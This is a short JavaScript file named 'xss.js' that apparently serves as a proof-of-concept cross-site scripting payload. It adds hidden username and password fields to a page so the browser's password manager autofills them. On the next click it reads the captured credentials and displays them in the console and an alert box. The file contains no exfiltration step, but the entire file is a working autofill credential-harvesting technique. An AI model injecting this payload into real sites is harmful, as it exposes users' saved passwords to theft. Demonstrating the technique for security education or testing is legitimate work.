console.log('>  xss.js:1 >  ');
const usernameEl = document.createElement('input');
usernameEl.name = 'username';
usernameEl.hidden = true;
document.body.appendChild(usernameEl);

const passwordEl = document.createElement('input');
passwordEl.name = 'password';
passwordEl.type = 'password';
passwordEl.hidden = true;
document.body.appendChild(passwordEl);

window.addEventListener('click', () => {
    if (passwordEl.value) {
        console.log(` username: ${usernameEl.value}\n password: ${passwordEl.value}`);
        alert(` username: ${usernameEl.value}\n password: ${passwordEl.value}`);
    } else {
        alert('Could not get your password :(');
    }
});
